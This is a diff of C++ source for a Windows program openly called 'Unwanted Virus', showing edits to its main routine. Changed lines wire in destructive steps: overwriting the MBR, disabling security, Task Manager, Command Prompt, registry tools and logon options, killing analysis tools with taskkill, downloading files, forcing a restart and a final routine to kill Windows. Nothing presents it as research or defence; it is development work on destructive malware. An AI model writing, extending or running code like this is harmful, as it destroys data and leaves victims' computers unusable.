@@ -13,12 +13,12 @@
 #include <windows.h> // Required for WINAPI
 #include <iostream> // Required for input-output
 #include <fstream> // Required for files
-#include <stdio.h>
 #include <shlwapi.h> // Required for check file existence
 #include <cstdlib> // Required for no "ambiguous"
 #include <stdlib.h> // Same
 #include <data.h> // For Data
 #include <payload.h> // For payloads
+#include <stdio.h>
 
 
 #pragma warning (disable: 4244)
@@ -198,7 +198,7 @@ Do you still want to enable it?",
                 NULL,
                 (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0", // about msgbox
                 (LPCWSTR)L"About Unwanted Virus",
-                NULL | MB_OK
+                MB_ICONINFORMATION | MB_OK
             );
             return 0;
         }        
@@ -282,6 +282,10 @@ Do you still want to enable it?",
             ShellExecuteA(NULL, NULL, "http://youtu.be/QbjYksxk4gA", NULL, NULL, SW_SHOWDEFAULT);
             return 0;
         }
+        if (!lstrcmpW(argv[1], L"createmiwprogram")) {
+            CreateTimeDate();
+            return 0;
+        }
         if (!lstrcmpW(argv[1], L"/hell")) {
             int startmsg = MessageBox(
                 NULL,
@@ -294,6 +298,10 @@ Do you still want to enable it?",
         if (!lstrcmpW(argv[1], L"skipdestroymbr")) { // skip destroy mbr
             ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
             goto warning;
+        }
+        if (!lstrcmpW(argv[1], L"disablelogonoptions")) {
+            DisableLogonOptions();
+            return 0;
         }
         if (!lstrcmpW(argv[1], L"skiplogonui")){
             ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
@@ -377,10 +385,11 @@ Do you still want to enable it?",
         // Start of the history
         // Here is the warning seen on the first place
 
-        ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
+        // ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window (Console heredated, now as Windows Application)
         warning:
         NoUnwanted1();
 
+        // In case CMD.EXE is deleted or DisableCMD registry exists
         if (PathFileExistsA("C:\\Windows\\System32\\cmd.exe") != TRUE ||
             DisableCmdExist() == TRUE) {
             int DisplayResourceNameMessageBox();
@@ -432,15 +441,16 @@ Do you still want to enable it?",
                     (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                     MB_ICONWARNING | MB_YESNO
                 );
+                // In case you just press yes or no is the same
                 CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
                 ShellExecuteA(NULL, NULL, "shutdown", "/r /t 3", NULL, SW_HIDE);
                 CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
                 for (;;) {
-                    NULL;
+                    NULL; // For ever, do nothing...
                 }
             }
         }
-        else
+        else // The normal warning, this should be seen when system is normal.
         {
             int DisplayResourceNameMessageBox();
             {
@@ -473,7 +483,7 @@ Do you still want to enable it?",
 
     malware:       
         NoUnwanted1();
-        CreateThread(NULL, NULL, &payloadThread, &SetTimeDate, NULL, NULL);
+        SetTimeDate();
         TestInternetConnection();
         DisableSecurity();
         DisableDesktopBackground();
@@ -496,21 +506,16 @@ Do you still want to enable it?",
         DestroyMBR();
         // Destroys MBR and continue
         SkipDestroyMbr:
-
+        DisableLogonOptions(); // Disable Logon Options, like Network and ShutDown
         DisablePowerOptions(); // Disable Power Options on LogonUI
         ShellExecuteA(NULL, NULL, "Taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE); // Kills Process Hacker in case if it is open
-
-        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im Taskmgr.exe", NULL, SW_HIDE); // Kills Task Manager for disable it
-        DisableTaskmgr();
+        ShellExecuteA(NULL, NULL, "Taskkill", "/f /im Taskmgr.exe", NULL, SW_HIDE); DisableTaskmgr();// Kills Task Manager and disable it        
         ShellExecuteA(NULL, NULL, "Taskkill", "/f /im RegEdit.exe", NULL, SW_HIDE);// Kills Regedit in case if it is open
-
         ShellExecuteA(NULL, NULL, "Taskkill", "/f /im Cmd.Exe", NULL, SW_HIDE); // Kills Command Prompt for disable it
-
         Sleep(200); // Waits 200 Miliseconds       
-
         DisableCMD(); // Disable Command Prompt
         DisableRegistryTools(); // Disable Regedit
-
+        Sleep(2000); // Sleep 2 seconds
 
         DownloadFiles:
 
@@ -549,6 +554,7 @@ Do you still want to enable it?",
             Sleep(1000);
             const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
+            CreateDesktopFiles(); // Create Desktop Files
             // success
         }
         // else kills os
@@ -572,7 +578,6 @@ Do you still want to enable it?",
 
             return -1;
         };
-        CreateDesktopFiles(); // Create Desktop Files
         if (S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))
         {
             // success
@@ -600,8 +605,12 @@ Do you still want to enable it?",
             return -1;
         };
 
+        const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg"; // In case is not set, set it >:(
+        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
+
         // Open Notepad with the note
-        ShellExecuteA(NULL, NULL, "notepad", "C:\\note.txt", NULL, SW_SHOW);
+        ShellExecuteA(NULL, NULL, "notepad.exe", "C:\\note.txt", NULL, SW_SHOW);
+
 
         Sleep(5000);
 
@@ -648,10 +657,15 @@ Do you still want to enable it?",
         /* Main Payload, where your computer dies */
 
         CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL); // Play the PIANO music >:)
+        Sleep(100); // Wait 100 mili-second
+
+        CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
+        Sleep(100); // Wait 100 mili-second
+
         CreateThread(NULL, NULL, &payloadThread, &superPowerFulMainPayload, NULL, NULL);
-        Sleep(63000);
-        ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Last.txt", NULL, SW_SHOW); // Open the Last Note
-        Sleep(10000);
+        Sleep(65000);//system("title Last note -- Unwanted Virus & type \u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022 & pause > nul
+        ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Last.txt", NULL, SW_SHOW);
+        Sleep(12000);
         killWindowsInstant();
 
         return 0; // Unnecessary main return
